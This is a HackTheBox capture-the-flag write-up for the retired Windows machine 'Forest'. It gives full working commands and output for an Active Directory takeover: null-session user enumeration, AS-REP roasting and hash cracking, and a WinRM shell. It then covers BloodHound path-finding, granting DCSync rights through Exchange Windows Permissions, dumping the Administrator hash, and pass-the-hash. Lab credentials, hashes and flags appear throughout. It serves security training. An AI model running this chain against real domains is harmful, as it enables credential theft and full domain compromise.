---
title: "HTB Forest — AS-REP Roasting, BloodHound & DCSync via Exchange Permissions"
date: 2026-05-18
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, as-rep-roasting, bloodhound, dcsync, exchange, writedacl, pass-the-hash, windows]
classes: wide
---

# HTB Forest

**Difficulty:** Easy  
**OS:** Windows Server 2016  
**Platform:** HackTheBox  
**Category:** Active Directory  
**Status:** Retired   

---

## Overview

Forest is one of those boxes that teaches you the full AD attack lifecycle
in a single machine. Anonymous enumeration gives you users. AS-REP roasting
gives you a hash. BloodHound shows you the path. Exchange group abuse gives
you DCSync. And then it's over.

The primary vector for pwning the box being the Exchange Windows Permissions WriteDACL abuse that shows up constantly
in real enterprise environments. 

---

## Enumeration

### Nmap

```bash
nmap -sV -sS -T4 -A -Pn 10.129.39.206
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
                            (Domain: htb.local)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

Standard AD port layout — Domain: **htb.local**, FQDN: **FOREST.htb.local**.

Port 5985 (WinRM) is open. Mental note filed.

Added to /etc/hosts:

```bash
echo "10.129.39.206 FOREST.htb.local htb.local" | sudo tee -a /etc/hosts
```

---

### SMB Check

```bash
nxc smb 10.129.39.206
```

```
SMB  10.129.39.206  445  FOREST  [*] Windows Server 2016 Standard 14393 x64
                                  (domain:htb.local) (Null Auth:True)
```

Null Auth is True — anonymous enumeration is on the table.

---

### enum4linux — Full User and Group Dump

```bash
enum4linux -a -r -K 5000 10.129.39.206

USERS:

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```

Null sessions allowed full LDAP enumeration i.e no credentials needed.

**Real users extracted:**

```
sebastien
lucinda
svc-alfresco    ← Service account! 
andy
mark
santi
```

**Critical group memberships found:**

```
Service Accounts        → has member: svc-alfresco
Privileged IT Accounts  → has member: Service Accounts
Exchange Windows Permissions → (interesting...)
Account Operators       → (group exists)
```

The `svc-alfresco` account immediately stood out — service accounts
commonly have Kerberos pre-authentication disabled.

---

## Initial Access

### AS-REP Roasting

```bash
cat > users.txt << 'EOF'
sebastien
lucinda
svc-alfresco
andy
mark
santi
administrator
EOF

impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.39.206 -no-pass
```

```
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:db0d947d2ac3b490e965a58f0f50b14d$...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```
![Description](/assets/images/f1.png)
**svc-alfresco** has pre-authentication disabled — hash obtained.

---

### Cracking the Hash

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```
![Description](/assets/images/f2.png)
```
$krb5asrep$23$svc-alfresco...[hash]...:s3rvice
```

**Credentials:** `svc-alfresco:s3rvice`

---

### WinRM Shell

```bash
nxc winrm 10.129.39.206 -u 'svc-alfresco' -p 's3rvice'
# [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

evil-winrm -i 10.129.39.206 -u 'svc-alfresco' -p 's3rvice'
```
![Description](/assets/images/f4.png)
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
ccbf84e216fd4d4427c80be3bcccec2b
```

**User Flag:** `ccbf84e216fd4d4427c80be3bcccec2b` ✅

---

## Privilege Escalation

### BloodHound Enumeration

Running BloodHound collection remotely from Kali — no need to upload
anything to the target:

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.39.206 -c all
```

Imported the generated JSON files into BloodHound and using pathfinding, was able to find the shortes oath to domain admin from svc-alfresco.

![Description](/assets/images/f5.png)

---

### The Attack Path

**Account Operators** is a privileged built-in group that can
create and manage user accounts and add members to non-protected groups.

**Exchange Windows Permissions** has **WriteDACL** on the domain object.
WriteDACL = we can write Access Control Entries to the domain.
Specifically, we can grant ourselves DCSync rights.

**DCSync** = mimicking a Domain Controller's replication behaviour
to request password hashes for any account from the real DC.
With DCSync rights, we can dump the Administrator hash without
touching LSASS.

---
![Description](/assets/images/f7.png)

### Creating a New User (Token Issue Workaround)

Adding svc-alfresco to Exchange Windows Permissions and trying to use
those rights immediately didn't work for some reason. The current session's Kerberos
token was issued before the group membership change, so the DC doesn't
recognize the new rights in the existing session.

The fix:  I created a brand new user. Their first authentication will
include the Exchange Windows Permissions group membership from the start.
![Description](/assets/images/f9.png)
```powershell
# In evil-winrm (Account Operators can create domain users!)
net user 0x5h4q Password123! /add /domain

# Add to Exchange Windows Permissions
net group "Exchange Windows Permissions" 0x5h4q /add /domain

# Verify
net group "Exchange Windows Permissions"
# Members: 0x5h4q 
```

---
![Description](/assets/images/f8.png)
### Granting DCSync Rights

```bash
impacket-dacledit htb.local/0x5h4q:'Password123!' -action write -rights DCSync -principal 0x5h4q -target-dn 'DC=htb,DC=local' -dc-ip 10.129.39.206
```

```
[*] DACL backed up to dacledit-xxx.bak
[*] DACL modified successfully!
```

0x5h4q now has DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights on the domain.

---

### DCSync — Dump Administrator Hash

```bash
impacket-secretsdump htb.local/0x5h4q:'Password123!'@10.129.39.206 -just-dc-user Administrator
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

**Administrator NTLM:** `32693b11e6aa90eb43d32c72a07ceea6`

---
![Description](/assets/images/f10.png)
### Pass-the-Hash → Root

```bash
evil-winrm -i 10.129.39.206 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c0ad2208998ea59cc865d0c034434108
```

**Root Flag:** `c0ad2208998ea59cc865d0c034434108` ✅
![Description](/assets/images/f11.png)
Domain pwned.

## The Token Refresh Problem.

During this box, adding svc-alfresco directly to Exchange Windows
Permissions and trying to use those rights immediately failed with
"Access Denied" even after reconnecting the WinRM session.

**Why?**

```
Windows authentication tokens contain a snapshot
of your group memberships at LOGIN TIME.

This snapshot is called the PAC
(Privilege Attribute Certificate)
and is embedded in your Kerberos ticket.

Adding you to a group in Active Directory
updates the directory — but NOT your
currently active Kerberos tickets.

New group membership is only reflected
in tokens issued AFTER the change.
```

**The fix:**

```
Create a new user as they have no cached tokens
Their FIRST authentication includes the new group
No refresh problem!

This is also why in real penetration tests,
persistence and careful timing matters.
```

---

## What did we learn?

**1. Null sessions can be gold**
Anonymous LDAP enumeration gave us every username,
group membership, and service account in the domain
without a single credential. Many organisations
leave this enabled unknowingly.

**2. Service accounts = AS-REP roasting targets**
Service accounts running automated processes often
have pre-authentication disabled for legacy compatibility.
Always test service accounts first.

**3. BloodHound is non-negotiable**
The Exchange Windows Permissions WriteDACL path
is not obvious from manual enumeration.
BloodHound visualized it instantly.
Always run BloodHound once you have valid creds.

**4. Exchange permissions are dangerous**
Exchange Windows Permissions having WriteDACL
on the domain is a common misconfiguration in
environments that have ever run Exchange Server.
Even after Exchange is removed, these ACLs persist.
This is a known attack vector — Microsoft refers to
it in multiple advisories.

**5. DCSync = no LSASS needed**
Traditional credential dumping touches LSASS
and gets caught by EDR solutions.
DCSync mimics domain controller replication —
much quieter and often missed.

---
![Domain Pwned](https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3eDVncXVlbmxocmhsa2I3ZHRma3BueXRkaXJvYzFib2pibDhpdDJqZiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/bk8UGCysurqC2gmJ0o/giphy.gif)

*Written by 0x5h4q | 0x5h4q.github.io*
